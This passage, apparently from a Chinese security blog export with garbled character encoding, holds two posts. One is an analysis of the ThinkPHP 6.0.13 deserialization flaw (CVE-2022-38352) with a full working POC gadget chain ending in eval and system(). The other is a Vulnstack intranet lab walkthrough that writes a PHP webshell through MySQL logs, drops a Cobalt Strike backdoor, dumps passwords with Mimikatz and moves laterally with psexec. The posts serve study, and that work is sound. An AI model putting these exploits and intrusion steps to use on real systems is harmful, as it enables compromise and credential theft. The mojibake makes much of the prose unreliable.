__call()é­”æœ¯æ–¹æ³• 1234567public function log($level, $message, array $context = []){ $this-&gt;record($message, $level, $context);}public function __call($method, $parameters){ $this-&gt;log($method, ...$parameters);} Channel::__call() ä¸­è°ƒç”¨äº† log()æ–¹æ³•ï¼Œè€Œlog()åˆè°ƒç”¨äº† record()æ–¹æ³• æˆ‘ä»¬è·Ÿè¿›æŸ¥çœ‹ä¸€ä¸‹ Channel::record() æ–¹æ³•çš„ä»£ç å®ç° 1234567891011121314151617181920212223242526public function record($msg, string $type = 'info', array $context = [], bool $lazy = true){ if ($this-&gt;close || (!empty($this-&gt;allow) &amp;&amp; !in_array($type, $this-&gt;allow))){ return $this; } if (is_string($msg) &amp;&amp; !empty($context)) { $replace = []; foreach ($context as $key =&gt; $val) { $replace['{' . $key . '}'] = $val; } $msg = strtr($msg, $replace); } if (!empty($msg) || 0 === $msg) { $this-&gt;log[$type][] = $msg; if ($this-&gt;event) { $this-&gt;event-&gt;trigger(new LogRecord($type, $msg)); } } if (!$this-&gt;lazy || !$lazy) { $this-&gt;save(); } return $this;} å‚æ•°éƒ½å¯æ§ å‰ä¸‰ä¸ªåˆ¤æ–­éƒ½å¯ä»¥è¿‡ è¿™é‡Œè¦åˆ©ç”¨çš„æ˜¯ç¬¬å››ä¸ªifåˆ¤æ–­ $lazyé»˜è®¤æ˜¯trueä¸å¯æ§ï¼Œä½†å¯ä»¥é€šè¿‡æ§åˆ¶$this-&gt;lazyå‚æ•°ä¸º false å³å¯è°ƒç”¨ Channel::save()æ–¹æ³•ï¼š ç»§ç»­è·Ÿè¿› æŸ¥çœ‹ä¸€ä¸‹ Channel::save()æ–¹æ³• çš„ä»£ç å®ç° 123456789101112131415public function save(): bool{ $log = $this-&gt;log; if ($this-&gt;event) { $event = new LogWrite($this-&gt;name, $log); $this-&gt;event-&gt;trigger($event); $log = $event-&gt;log; }if ($this-&gt;logger-&gt;save($log)) { $this-&gt;clear(); return true;} return false;} å…¶ä¸­ $this-&gt;loggerå¯æ§ å› æ­¤æˆ‘ä»¬å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„save()æ–¹æ³• ç»§ç»­æ‰¾å¯åˆ©ç”¨çš„ï¼Œå“ªä¸ªç±»çš„save()æ–¹æ³•å¯ä»¥åˆ©ç”¨å‘¢ï¼Ÿ æˆ‘ä»¬æ‰¾åˆ°äº† think\\log\\driver\\Socket ç±»çš„save()æ–¹æ³•ï¼š è¯¥æ–¹æ³•å­˜åœ¨ invoke()æ–¹æ³•ï¼Œç±»ä¼¼äºjavaé‡Œçš„åå°„ï¼Œå¯ä»¥åˆ©ç”¨ è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³• ä¸‹é¢å°±æƒ³åŠæ³• æ€ä¹ˆæ‰§è¡Œåˆ°æ­¤å¤„ é¦–å…ˆæ˜¯è¦ç»•è¿‡ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼Œif (!$this-&gt;check())ï¼Œéœ€è¦check()æ–¹æ³•è¿”å›trueï¼Œcheckæ–¹æ³•çš„ä¸»è¦åŠŸèƒ½æ˜¯è·å–ç”¨æˆ·è¾“å…¥çš„taidå‚æ•°ã€æ£€æŸ¥æ˜¯å¦è®°å½•æ—¥å¿—å’Œç”¨æˆ·è®¤è¯ è·Ÿè¿›check()æ–¹æ³•çœ‹çœ‹ï¼š è¿™é‡Œæ§åˆ¶ $this-&gt;clientArg[â€˜tabidâ€™] = 1 $this-&gt;config[â€˜force_client_idsâ€™] ä¸º 1 $this-&gt;config[â€˜allow_client_idsâ€™] ä¸ºç©º å³å¯ä½¿ Socket::check() è¿”å›true å›åˆ° Socket::check() ç»§ç»­çœ‹ç¬¬äºŒä¸ªåˆ¤æ–­ï¼Œéœ€è¦æ»¡è¶³ $this-&gt;config[â€˜debugâ€™] = true å¼€å¯debug $this-&gt;app-&gt;exists(â€˜requestâ€™) è¿”å› true å³å¯æ§åˆ¶ $currentUri çš„å€¼ ç¬¬äºŒä¸ªæ¡ä»¶æ˜¯é‡ç‚¹ï¼Œ$this-&gt;app åº”è¯¥ä¸º think\\App ç±»å®ä¾‹ æˆ‘ä»¬è·Ÿè¿›æŸ¥çœ‹ä¸€ä¸‹ exists()æ–¹æ³•çš„ä»£ç å®ç°ï¼š think\\App ä¸å­˜åœ¨exists()æ–¹æ³• å› æ­¤ä¼šç»§æ‰¿å…¶çˆ¶ç±» think\\Container ä¸­çš„ exists()æ–¹æ³• ä¼ å…¥çš„$abstractå‚æ•°æ˜¯requestï¼Œè°ƒç”¨getAlias()æ–¹æ³•ã€‚è¿™ä¸ªæ–¹æ³•ä½œç”¨ä¸ºï¼šæ ¹æ®åˆ«åè·å–çœŸå®ç±»åï¼Œæ‰€ä»¥è¿™ä¸ªå‡½æ•°çš„è¿”å›çš„æ˜¯think\\Requestã€‚ç„¶å return isset($this-&gt;instances[$abstract]); å› æ­¤ isset($this-&gt;instances[$abstract]) éœ€è¦ä¸º trueï¼Œå³ç»™$this-&gt;instancesèµ‹å€¼ä¸º['think\\Request'=&gt;new Request()] æ‰€ä»¥ç»™$this-&gt;appèµ‹å€¼ä¸ºthink\\APPç±»ï¼Œ$this-&gt;app-&gt;instances = [â€˜think\\Requestâ€™=&gt;new Request()]; ç„¶åç»§ç»­å‘ä¸‹ è¿›å…¥ifè¯­å¥é‡Œï¼š 123if ($this-&gt;app-&gt;exists('request')) { $currentUri = $this-&gt;app-&gt;request-&gt;url(true);} æ‰§è¡Œ $this-&gt;app-&gt;request-&gt;url(true)ï¼Œè°ƒç”¨ request ç±»çš„url()æ–¹æ³•ï¼Œå½¢å‚$complete ä¸ºtrue ç„¶åè·å– request å®ä¾‹å¯¹è±¡çš„ url å±æ€§çš„å€¼(å¯æ§)ï¼Œèµ‹å€¼ç»™$url å› ä¸ºä¼ å…¥çš„$completeå‚æ•°ä¸ºtrueï¼Œæ‰€ä»¥ä¼šè°ƒç”¨domain()æ–¹æ³•ï¼Œå¹¶å°†domain()æ–¹æ³•è¿”å›ç»“æœ (http://) å’Œ$urlæ‹¼æ¥èµ·æ¥ ä½œä¸ºè¿”å›ç»“æœèµ‹å€¼ $currentUri ç„¶åè¿›å…¥ç¬¬ä¸‰ä¸ªifåˆ¤æ–­ï¼Œç»™$this-&gt;config[â€˜format_headâ€™]èµ‹å€¼ï¼Œå³å¯æ‰§è¡ŒContainerç±»çš„invokeæ–¹æ³•ï¼š 1234567if (!empty($this-&gt;config['format_head'])) { try { $currentUri = $this-&gt;app-&gt;invoke($this-&gt;config['format_head'], [$currentUri]); } catch (NotFoundExceptionInterface $notFoundException) { // Ignore exception }} è·Ÿè¿›invoke()æ–¹æ³•ï¼Œæ‰§è¡Œç¬¬ä¸‰ä¸ªreturnè¯­å¥ ç»§ç»­è·Ÿè¿› Containerç±»çš„invokeMethod()æ–¹æ³• å…¶ä¸­ $classå’Œ$method æ˜¯æˆ‘ä»¬æ§åˆ¶çš„$this-&gt;config['format_head']å˜é‡ä¸­çš„å†…å®¹ï¼Œ $varsæ˜¯$currentUriå˜é‡ä¸­çš„å†…å®¹ï¼Œè€Œ$currentUriå˜é‡ æ˜¯ å‰é¢æåˆ°çš„Requestç±»çš„url()æ–¹æ³•èµ‹å€¼çš„ã€‚è¯¥æ–¹æ³• returnæ—¶ æ‹¼æ¥æ—¶ä¼ å…¥çš„$this-&gt;urléƒ¨åˆ†æ˜¯æˆ‘ä»¬å¯æ§çš„ æ§åˆ¶ $this-&gt;urlçš„å€¼ä¸ºæ¶æ„ä»£ç å³å¯ ç±»ã€ç±»çš„æ–¹æ³•ã€ä¼ å…¥çš„å‚æ•° è¿™ä¸‰ä¸ªå€¼æˆ‘ä»¬éƒ½å¯æ§ï¼Œå› æ­¤å¯ä»¥è°ƒç”¨ ä»»æ„ç±»çš„ä»»æ„å‡½æ•° æ‰§è¡Œè‡ªå·±æƒ³è¦çš„æ“ä½œ å› æ­¤ã€ç°åœ¨å¯»æ‰¾ä¸€ä¸ªå¯åˆ©ç”¨çš„ç±»å’Œæ–¹æ³•å³å¯ è€Œæˆ‘ä»¬å‰é¢æåˆ°äº†ï¼š think\\view\\driver\\Php.php ç±»çš„ display()æ–¹æ³• é‡Œ å­˜åœ¨ eval()å‡½æ•° eval()å‡½æ•°çš„å‚æ•°ä¸º â€˜?&gt;â€™ æ‹¼æ¥ å‡½æ•°å‚æ•°ä¼ å…¥çš„$contentçš„å€¼ è°ƒç”¨ Php-&gt;display(&quot;&lt;?php æ¶æ„ä»£ç ;?&gt;&quot;) å³å¯å®ç° rce å³ï¼š Socketç±»ï¼š$this-&gt;config[â€˜format_headâ€™] = [new \\think\\view\\driver\\Php,â€™displayâ€™] Requestç±»ï¼š$this-&gt;url = '&lt;?php system(\\'calc\\'); exit(); ?&gt;'; æœ€ç»ˆç¼–å†™ poc å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;?phpnamespace League\\Flysystem\\Cached\\Storage{ class Psr6Cache{ private $pool; protected $autosave = false; public function __construct($exp) { $this-&gt;pool = $exp; } }}namespace think\\log{ class Channel{ protected $logger; protected $lazy = true; public function __construct($exp) { $this-&gt;logger = $exp; $this-&gt;lazy = false; } }}namespace think{ class Request{ protected $url; public function __construct() { $this-&gt;url = '&lt;?php system(&quot;calc&quot;); exit(); ?&gt;'; } } class App{ protected $instances = []; public function __construct() { $this-&gt;instances = ['think\\Request'=&gt;new Request()]; } }}namespace think\\view\\driver{ class Php{}}namespace think\\log\\driver{ class Socket{ protected $config = []; protected $app; protected $clientArg = []; public function __construct() { $this-&gt;config = [ 'debug'=&gt;true, 'force_client_ids' =&gt; 1, 'allow_client_ids' =&gt; [], 'format_head' =&gt; [new \\think\\view\\driver\\Php,'display'], # åˆ©ç”¨ç±»å’Œæ–¹æ³• ]; $this-&gt;app = new \\think\\App(); $this-&gt;clientArg = ['tabid'=&gt;'1']; } }}namespace{ $c = new think\\log\\driver\\Socket(); $b = new think\\log\\Channel($c); $a = new League\\Flysystem\\Cached\\Storage\\Psr6Cache($b); echo urlencode(base64_encode(serialize($a)));} äº”ã€æ¼æ´å¤ç°æœ¬åœ° php_study_pro å¼€ä¸ªngnixç¯å¢ƒ æ‰‹åŠ¨åœ¨ app/controller/Index.php æ·»åŠ ä¸€ä¸ªååºåˆ—åŒ–ç‚¹ 12345678910111213141516171819&lt;?phpnamespace app\\controller;use app\\BaseController;class Index extends BaseController{ public function index(){ if($_POST[&quot;a&quot;]){ unserialize(base64_decode($_POST[&quot;a&quot;])); } return &quot;hello&quot;; } public function hello($name = 'ThinkPHP6') { return 'hello,' . $name; }} æŠŠpoc ç”Ÿæˆçš„payload æ‰“ä¸€ä¸‹ æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ è¿™ä¸ªååºåˆ—åŒ–æ¼æ´ï¼Œä¸»è¦ç‚¹é›†ä¸­åœ¨åœ¨ Socketç±» çš„å˜é‡æ§åˆ¶ã€phpçš„åå°„ ä»¥åŠ Phpç±»ä¸­çš„displayæ–¹æ³•åˆ©ç”¨ å‚è€ƒï¼š https://github.com/top-think/framework/issues/2749 https://xz.aliyun.com/t/12169","link":"/2023/08/26/Thinkphp-v6-0-13%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2022-38352-%E5%88%86%E6%9E%90/"},{"title":"Vulnstack-çº¢æ—¥å®‰å…¨å†…ç½‘é¶åœº[ä¸€]","text":"&lt;1&gt; ç¯å¢ƒæ­å»ºé¶åœºä¸‹è½½é“¾æ¥ï¼šhttp://vulnstack.qiyuanxuetang.net/vuln/detail/2/è™šæ‹Ÿæœºæ‰€æœ‰ç»Ÿä¸€å¯†ç ï¼šhongrisec@2019(æœ‰çš„ä¼šæç¤ºå¯†ç å·²è¿‡æœŸï¼Œéšä¾¿æ”¹æ”¹ æˆ‘æ”¹æˆäº†Hongrisec@2019)ç½‘ç»œæ‹“æ‰‘å›¾å¦‚ä¸‹ï¼š è¿™é‡Œæˆ‘è®¾ç½®çš„ç½‘ç»œæ˜¯VMnet3å’ŒVMnet8ï¼Œå…¶å®æ— æ‰€è°“è®¾ç½®å“ªä¸¤ä¸ªç½‘ç»œï¼Œæœ€é‡è¦çš„æ˜¯éœ€è¦ä¸¤ä¸ªç½‘ç»œï¼Œä¸”ä¸èƒ½åœ¨åŒä¸€ä¸ªç½‘æ®µå†…ï¼ˆå› ä¸ºéœ€è¦ä¸€ä¸ªåšå¤–ç½‘ä¸€ä¸ªåšå†…ç½‘ï¼‰ ipé…ç½®å¦‚ä¸‹ï¼š 1234kali (æ”»å‡»æœº)ï¼š192.168.236.128 ï¼ˆVMnet8 ç½‘å¡åˆ†é…çš„IPï¼‰Windows 7 (webæœåŠ¡å™¨)ï¼š192.168.236.132ï¼ˆå¤–ç½‘å’Œkaliè¿é€šï¼‰ã€192.168.52.143ï¼ˆå†…ç½‘ipï¼‰Windows 2008 (åŸŸæ§)ï¼š192.168.52.138Win2k3 (åŸŸç®¡)ï¼š192.168.22. ã€æ³¨æ„ã€‘å®é™…ä¸ŠåŸŸç¯å¢ƒä¸‰å°è™šæ‹Ÿæœºçš„ IP åˆå§‹çŠ¶æ€å°±å·²ç»è¢«é…ç½®ä¸ºå›ºå®šçš„ 192.168.52.XXX/24ç½‘æ®µï¼ˆåŒæ—¶å·²é…ç½®å¥½åŸŸæ§ IP å¿…å®šä¸º 192.168.52.138ï¼‰ï¼Œæ•… æˆ‘ä»¬è¦è®¾ç½®çš„å†…ç½‘ç½‘å¡ å³ VMware çš„ VMnet3 ç½‘å¡åº”æ³¨æ„ä¹Ÿé…ç½®ä¸º 192.168.52.XXX/24 ç½‘æ®µ (æŠŠVMnet3æ”¹æˆå…¶ä»–çš„ä¹Ÿå¯ä»¥ï¼Œä½†æ˜¯é‚£æ ·è¿˜éœ€è¦è‡ªå·±å»ç½‘ç»œé‡Œä¿®æ”¹ä¸€ä¸‹è¢«é…ç½®çš„å›ºå®š192.168.52.XXX/24ç½‘æ®µ éº»çƒ¦ä¸€ç‚¹ï¼Œå°±ç”¨52å§) (1) é…ç½®Win7 webæœåŠ¡å™¨ç½‘ç»œä»ç½‘ç»œæ‹“æ‰‘å›¾å¾—çŸ¥ï¼Œéœ€è¦æ¨¡æ‹Ÿå†…ç½‘å’Œå¤–ç½‘ä¸¤ä¸ªç½‘æ®µï¼Œ Win7 è™šæ‹Ÿæœºç›¸å½“äºç½‘å…³æœåŠ¡å™¨ï¼Œæ‰€ä»¥éœ€è¦ä¸¤å¼ ç½‘å¡ï¼Œæ•…éœ€è¦é…ç½®ä¸¤ä¸ªç½‘ç»œé€‚é…å™¨ï¼ˆç½‘å¡ï¼‰ï¼Œç‚¹å‡»æ·»åŠ ç½‘ç»œè®¾é…å™¨ï¼š å³é”®å³ä¸‹è§’ç”µè„‘å›¾æ ‡ -&gt; æ‰“å¼€ç½‘ç»œå’Œå…±äº«ä¸­å¿ƒ -&gt; æ›´æ”¹é€‚é…å™¨è®¾ç½® -&gt; å³é”®ç½‘ç»œæœ¬åœ°è¿æ¥(ç‚¹å±æ€§) -&gt; é€‰Internet åè®®ç‰ˆæœ¬ 4(TCP/ipv4) å³å¯è®¾ç½®IPåœ°å€ä¸º 192.168.236.132 èƒ½ping é€škaliæœºï¼Œè¯´æ˜å’Œå¤–ç½‘å·²ç»è¿é€šäº†ï¼Œè¿™é‡Œè¿˜æœ‰ä¸€ç‚¹å°±æ˜¯è®°å¾—æŠŠWIndows 7è¿™ä¸ªwebæœåŠ¡å™¨é˜²ç«å¢™çš„å…³é—­ï¼Œå¦åˆ™kaliä¼šping ä¸é€š åŒç† å†…ç½‘ipè®¾ç½®ä¸ºï¼š pingä¸€ä¸‹DCæœºï¼ŒåŸŸå†…ç½‘ç»œä¹Ÿé…ç½®æ­£å¸¸ åœ¨ Win7 å¤–ç½‘æœåŠ¡å™¨ä¸»æœºçš„ C ç›˜æ‰¾åˆ° PhpStudy å¯åŠ¨ Web æœåŠ¡ï¼ˆæ¨¡æ‹Ÿå¤–ç½‘ Web ç«™ç‚¹ï¼‰ï¼š å¼€å¯ä¹‹åï¼Œæˆ‘ä»¬åœ¨æˆ‘ä»¬çš„ä¸»æœº è®¿é—®ä¸€ä¸‹win7ï¼Œå¯ä»¥æ­£å¸¸è®¿é—®åˆ°PHPæ¢é’ˆ è¿™æ ·æˆ‘ä»¬çš„ç¯å¢ƒå°±ç›¸å½“äºæ˜¯é…ç½®å¥½å•¦ (2) é…ç½® Winserver 2008ç½‘ç»œ(DCåŸŸæ§)hongrisec@2019 ç™»å½•çš„æ—¶å€™ï¼Œæ˜¾ç¤ºå¯†ç è¿‡æœŸ è‡ªå·±æ”¹æˆäº† Hongrisec@2019 Win2008 DCåŸŸæ§ä¸»æœºipä¸º 192.168.52.138 é»˜è®¤é…å¥½äº†çš„ (3) é…ç½® Win2003/win2k3ç½‘ç»œ(åŸŸæˆå‘˜)åŸŸå†…ä¸»æœº win2003 ipä¸º192.168.236.141 ä¸å¤–ç½‘ä¸è¿é€š &lt;2&gt; å¤–ç½‘è¾¹ç•Œçªç ´(1) ä¿¡æ¯æ”¶é›†(å¼±å£ä»¤+å¼€æ”¾äº†phpmyadminã€yxcms)åœ¨å¤–ç½‘ç«™ç‚¹çœ‹è§äº†ä¸€ä¸ªMySQL è¿æ¥æ£€æµ‹ï¼š æ£€æµ‹ä¸€ä¸‹ï¼Œå­˜åœ¨å¼±å£ä»¤ root:root è¿æ¥æ­£å¸¸ ä½†å•ä»è¿™åªèƒ½æ£€æµ‹ï¼Œè¿˜åˆ©ç”¨ä¸äº†å‘¢æ‰«ä¸€ä¸‹ç›®å½•ï¼Œçœ‹çœ‹æœ‰ä»€ä¹ˆä¸œè¥¿ã€‚æ‰«æåˆ°äº† phpmyadmin è®¿é—®/phpmyadmin ä½¿ç”¨ åˆšåˆšæ£€æµ‹åˆ°çš„ root:root ç™»å½•ä¸€ä¸‹ï¼ŒæˆåŠŸç™»å½•è¿›å»äº† phpmyadminæ˜¯ä¸€ä¸ªä»¥ PHP ä¸ºåŸºç¡€ï¼Œä»¥ Web-Base æ–¹å¼æ¶æ„åœ¨ç½‘ç«™ä¸»æœºä¸Šçš„ MySQL çš„æ•°æ®åº“ç®¡ç†å·¥å…·ï¼Œè®©ç®¡ç†è€…å¯ç”¨ Web æ¥å£ç®¡ç† MySQL æ•°æ®åº“ åœ¨é‡Œé¢çœ‹è§äº†mysqlæ•°æ®åº“å’Œä¸€ä¸ª yxcmsçš„æ•°æ®åº“ï¼Œåº”è¯¥ä¹Ÿå­˜åœ¨ä¸€ä¸ªyxcmsæœåŠ¡ (2) PhpMyAdmin åå° Getshellphpmyadminæœ‰ä¸¤ç§getshellæ–¹å¼ï¼š into outfileå¯¼å‡ºæœ¨é©¬ åˆ©ç”¨Mysqlæ—¥å¿—æ–‡ä»¶getshell æˆ‘ä»¬æŒ¨ä¸ªè¯•ä¸€ä¸‹ã€‚ -å°è¯•into outfileå¯¼å‡ºæœ¨é©¬ï¼ˆå¤±è´¥ï¼‰æ‰§è¡Œ select @@basedir; æŸ¥çœ‹ä¸€ä¸‹ç½‘ç«™çš„è·¯å¾„ è·¯å¾„ä¸ºï¼šC:/phpStudy/MySQL/ å†æ‰§è¡Œ select '&lt;?php eval($_POST[cmd]);?&gt;' into outfile 'C:/phpStudy/www/hack.php'; ç›´æ¥å°†æœ¨é©¬å†™å…¥åˆ° wwwç½‘ç«™æ ¹ç›®å½•ä¸‹ å¤±è´¥ è¿™æ˜¯å› ä¸º Mysqlæ–°ç‰¹æ€§secure_file_privä¼šå¯¹è¯»å†™æ–‡ä»¶äº§ç”Ÿå½±å“ï¼Œè¯¥å‚æ•°ç”¨æ¥é™åˆ¶å¯¼å…¥å¯¼å‡ºã€‚æˆ‘ä»¬å¯ä»¥å€ŸåŠ©show global variables like '%secure%';å‘½ä»¤æ¥æŸ¥çœ‹è¯¥å‚æ•° å½“secure_file_privä¸ºNULLæ—¶ï¼Œè¡¨ç¤ºé™åˆ¶Mysqlä¸å…è®¸å¯¼å…¥å¯¼å‡ºï¼Œè¿™é‡Œä¸ºNULLã€‚æ‰€ä»¥into outfileå†™å…¥æœ¨é©¬å‡ºé”™ã€‚è¦æƒ³ä½¿å¾—è¯¥è¯­å¥å¯¼å‡ºæˆåŠŸï¼Œåˆ™éœ€è¦åœ¨Mysqlæ–‡ä»¶å¤¹ä¸‹ä¿®æ”¹my.ini æ–‡ä»¶ï¼Œåœ¨[mysqld]å†…åŠ å…¥secure_file_priv =â€â€ã€‚ ç›´æ¥å†™å…¥æœ¨é©¬ä¸è¡Œï¼Œé‚£æˆ‘ä»¬å°±æ¢å¦ä¸€ç§æ–¹æ³•â€”Mysqlæ—¥å¿—æ–‡ä»¶å†™å…¥shell -åˆ©ç”¨Mysqlæ—¥å¿—æ–‡ä»¶å†™å…¥shellå…ˆæ‰§è¡Œå‘½ä»¤ï¼šshow variables like '%general%'; æŸ¥çœ‹æ—¥å¿—çŠ¶æ€ï¼š å½“å¼€å¯ general_log æ—¶ï¼Œæ‰€æ‰§è¡Œçš„ SQL è¯­å¥éƒ½ä¼šå‡ºç°åœ¨ stu1.log æ–‡ä»¶ä¸­ã€‚é‚£ä¹ˆå¦‚æœä¿®æ”¹ general_log_file çš„å€¼ä¸ºä¸€ä¸ªphpæ–‡ä»¶ï¼Œåˆ™æ‰€æ‰§è¡Œçš„ SQL è¯­å¥å°±ä¼šå¯¹åº”ç”Ÿæˆåœ¨å¯¹åº”çš„æ–‡ä»¶ä¸­ï¼Œè¿›è€Œå¯ Getshell SET GLOBAL general_log='on'å¼€å¯ general_log SET GLOBAL general_log_file='C:/phpStudy/www/hack.php'æŒ‡å®šæ—¥å¿—å†™å…¥åˆ°ç½‘ç«™æ ¹ç›®å½•çš„ hack.php æ–‡ä»¶ ç„¶åæ¥ä¸‹æ¥æ‰§è¡Œ SQL è¯­å¥ï¼šSELECT '&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;'ï¼Œå³å¯å°†ä¸€å¥è¯æœ¨é©¬å†™å…¥ hack.php æ–‡ä»¶ä¸­ è®¿é—®/hack.php æˆåŠŸå†™å…¥ ä¸Šèšå‰‘ è¿ä¸Šå»äº† (3)yxcmsåå°ä¸Šä¼ getshellå‰é¢æˆ‘ä»¬ç™»å½•è¿›å»ä¹‹åï¼Œå¯ä»¥çœ‹åˆ°è¿˜æœ‰ä¸€ä¸ªyxcmsçš„æ•°æ®åº“ï¼ŒåŒæ—¶æˆ‘ä»¬è¿›å…¥åå°ä¹‹åï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ª beifen.rarå¤‡ä»½æ–‡ä»¶å’Œyxcmsç›®å½•ï¼Œè¿™é“é¢˜å…¶å®è¿˜æœ‰ä¸€ç§getshellçš„æ–¹æ³•ï¼Œè¿™é‡Œæˆ‘ä»¬ä¹Ÿè®°å½•ä¸€ä¸‹ã€‚ å­—å…¸ä¸å¤Ÿå¼ºå¤§ï¼Œæ²¡æ‰«å‡ºæ¥ beifen.rarå’Œ /yxcms è®¿é—®/yxcmsï¼Œå¯ä»¥çœ‹åˆ°åœ¨å…¬å‘Šå¤„ï¼Œæ³„éœ²äº† yxcmsçš„adminåå°ç™»å½•è·¯å¾„ ä»¥åŠ é»˜è®¤çš„å¯†ç  æˆåŠŸç™»å½•åˆ°åå° xxcmsï¼Œæ—¢ç„¶åå°éƒ½ç™»å½•åˆ°äº†ï¼Œé‚£æ‹¿shellè¿˜ä¸ç®€å•å—ï¼Œä¸€èˆ¬å°±æ˜¯æ‰¾ä¸€æ‰¾æ¨¡æ¿ç¼–è¾‘çš„åœ°æ–¹ï¼Œå†™å…¥ä¸€å¥è¯ğŸï¼Œæˆ–è€…å†™å…¥æ—¥å¿—ï¼Œè¿™é‡Œåˆšå¥½å°±æœ‰ç¼–è¾‘æ¨¡æ¿çš„åœ°æ–¹ï¼Œæˆ‘ä»¬æ–°å¢ä¸€ä¸ªshell.php å»ºç«‹æ˜¯å»ºç«‹äº†ï¼Œshell.php ç”Ÿæˆåˆ°å“ªäº†å‘¢ï¼Ÿï¼Ÿ è¿™é‡Œå°±éœ€è¦æˆ‘ä»¬å‰é¢æåˆ°çš„ beifen.rar å¤‡ä»½æ–‡ä»¶äº†ï¼Œæˆ‘ä»¬æŠŠå¤‡ä»½æ–‡ä»¶è§£å‹ï¼Œåœ¨é‡Œé¢å¯»æ‰¾æ¨¡æ¿çš„è¿™ä¹ˆå¤šphp éƒ½å­˜æ”¾åœ¨äº†:/yxcms/protected/apps/default/view/default/å› æ­¤æˆ‘ä»¬çš„shell.php å°±ç”Ÿæˆåœ¨äº†è¿™é‡Œ èšå‰‘è¿æ¥ æ‹¿åˆ°shell &lt;3&gt; å†…ç½‘ä¿¡æ¯æ¢æµ‹æˆ‘ä»¬åœ¨æ‹¿åˆ°çš„shell æ‰§è¡Œ whoami å‘ç°æ˜¯administratoræƒé™ åœ¨åŸŸä¸­ifconfig å‘ç°äº†å†…ç½‘ç½‘æ®µ 192.168.52.0/24 (1) é¶æœºä¸Šçº¿CSåœ¨kalié‡Œ ./teamserver 192.168.236.128 cs123456 è¿è¡ŒcsæœåŠ¡ ä¸»æœºè¿è¡ŒCS å®¢æˆ·ç«¯å¹¶è¿æ¥ CS æœåŠ¡ç«¯ï¼Œé…ç½®å¥½listenerç›‘å¬å™¨ä¹‹åï¼Œç”Ÿæˆ exeåé—¨ç¨‹åº åˆ©ç”¨èšå‰‘ æŠŠç”Ÿæˆçš„artifact.exe ä¸Šä¼ åˆ°é¶æœºä¸Šï¼š åœ¨ç»ˆç«¯é‡Œæ‰§è¡Œ artifact.exe å¯ä»¥çœ‹åˆ°é¶æœºä¸Šçº¿åˆ°CSä¸Š å¯ä½¿ç”¨ Mimikatz ç›´æ¥æŠ“å–æœ¬æœºç”¨æˆ·å¯†ç ï¼š è¿™é‡ŒæŠ“å–åˆ°å¯†ç ä¹‹åï¼Œæˆ‘ä»¬æ‰§è¡Œ net view å‘ç°äº†åŸŸå†…å¦å¤–ä¿©å°æœºå™¨ç‚¹å‡»è¿™é‡Œå¯ä»¥çœ‹åˆ° å¯ä»¥åˆ©ç”¨æŠ“å–åˆ°çš„å¯†ç  psexecå–loginä¸€ä¸‹ ç›‘å¬å™¨é€‰ windows_smb/bind_pipe æ‹¿åˆ°æ­£å‘ä¼šè¯(å‰é¢ä¸‰å±‚å†…ç½‘é¶æœºæœ‰è®²æ­£å‘åå‘)ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥å³é”® ç›®æ ‡-&gt;æ–‡ä»¶ç®¡ç† å¯ä»¥çœ‹åˆ°åŸŸæ§çš„æ–‡ä»¶ æˆ‘ä»¬å¯ä»¥è¿›è¡Œä¸Šä¼ æ–‡ä»¶æ“ä½œï¼Œç®—æ˜¯æ‰“é€šäº† è¿™æ˜¯CSå¯ä»¥ç”¨åˆ°çš„ä¸€ç‚¹ã€‚è¿™é‡Œèƒ½æ‹¿åˆ°æ˜¯å› ä¸ºæˆ‘ä»¬åŸŸæ§çš„å¯†ç å’Œwin7ã€å¯†ç è®¾ç½®ä¸€æ ·äº†ã€‚åˆšå¥½å¯ä»¥æ‹¿ä¸‹ æˆ‘ä»¬ä¸‹é¢å†çœ‹çœ‹å…¶ä»–æ–¹æ³• æ¨ªå‘ç§»åŠ¨æ‹¿åˆ°åŸŸæ§å’ŒåŸŸå†…å…¶ä»–æœºå™¨ (2) åŸŸå†…ä¿¡æ¯æ”¶é›†å†…ç½‘ä¿¡æ¯æ”¶é›†çš„ä¸»è¦ç›®çš„å°±æ˜¯æŸ¥æ‰¾åŸŸæ§ä»¥åŠåŸŸå†…çš„å…¶ä»–ä¸»æœº 123456789101112net view # æŸ¥çœ‹å±€åŸŸç½‘å†…å…¶ä»–ä¸»æœºånet config Workstation # æŸ¥çœ‹è®¡ç®—æœºåã€å…¨åã€ç”¨æˆ·åã€ç³»ç»Ÿç‰ˆæœ¬ã€å·¥ä½œç«™ã€åŸŸã€ç™»å½•åŸŸnet user # æŸ¥çœ‹æœ¬æœºç”¨æˆ·åˆ—è¡¨net user /domain # æŸ¥çœ‹åŸŸç”¨æˆ·net localgroup administrators # æŸ¥çœ‹æœ¬åœ°ç®¡ç†å‘˜ç»„ï¼ˆé€šå¸¸ä¼šæœ‰åŸŸç”¨æˆ·ï¼‰net view /domain # æŸ¥çœ‹æœ‰å‡ ä¸ªåŸŸnet user ç”¨æˆ·å /domain # è·å–æŒ‡å®šåŸŸç”¨æˆ·çš„ä¿¡æ¯net group /domain # æŸ¥çœ‹åŸŸé‡Œé¢çš„å·¥ä½œç»„ï¼ŒæŸ¥çœ‹æŠŠç”¨æˆ·åˆ†äº†å¤šå°‘ç»„ï¼ˆåªèƒ½åœ¨åŸŸæ§ä¸Šæ“ä½œï¼‰net group ç»„å /domain # æŸ¥çœ‹åŸŸä¸­æŸå·¥ä½œç»„net group &quot;domain admins&quot; /domain # æŸ¥çœ‹åŸŸç®¡ç†å‘˜çš„åå­—net group &quot;domain computers&quot; /domain # æŸ¥çœ‹åŸŸä¸­çš„å…¶ä»–ä¸»æœºånet group &quot;doamin controllers&quot; /domain # æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ä¸»æœºåï¼ˆå¯èƒ½æœ‰å¤šå°ï¼‰ 1ã€å…ˆåˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸï¼Œä½¿ç”¨ ipconfig /all æŸ¥çœ‹ DNS æœåŠ¡å™¨ï¼Œå‘ç°ä¸» DNS åç¼€ä¸ä¸ºç©ºï¼Œå­˜åœ¨åŸŸgod.org 